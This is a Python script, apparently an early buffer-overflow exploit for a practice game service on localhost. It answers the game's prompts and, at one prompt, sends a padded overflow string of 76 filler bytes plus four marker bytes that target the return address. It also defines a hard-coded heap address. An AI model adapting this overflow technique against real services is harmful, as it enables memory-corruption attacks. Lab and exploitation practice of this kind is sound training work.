import socket
import time

s = socket.socket()
s.connect(("localhost", 379))

heapLocation = "\xC8\xF0\x62\x00"

data = s.recv(1024)
decoded = data.decode()

while len(decoded) != 0:
    
    print(decoded)
    
    if decoded.__contains__("Play the game"):
        msg = "1"
        print(f">>> Sending {msg}\n")
        s.send(msg.encode())
    
    if decoded.__contains__("pick a name"):
        msg = "Gorak\0"
        #msg = "A" * 2000
        print(f">>> Sending {msg}\n")
        s.send(msg.encode())

    if decoded.__contains__("Ale, of course!"):
        msg = "1"
        print(f">>> Sending {msg}\n")
        s.send(msg.encode())

    if decoded.__contains__("shall we drink to?"):
        #msg = "The Horde\0"
        msg = "A" * 76 + "B" * 4 + "C" * 10
        print(f">>> Sending {msg}\n")
        s.send(msg.encode())

    if decoded.__contains__("shall you do now?"):
        msg = "2"
        print(f">>> Sending {msg}\n")
        s.send(msg.encode())

    try:        
        data = s.recv(1024)
        decoded = data.decode()
        time.sleep(1)
    except:
        data = 0
        decoded = ""

s.close()
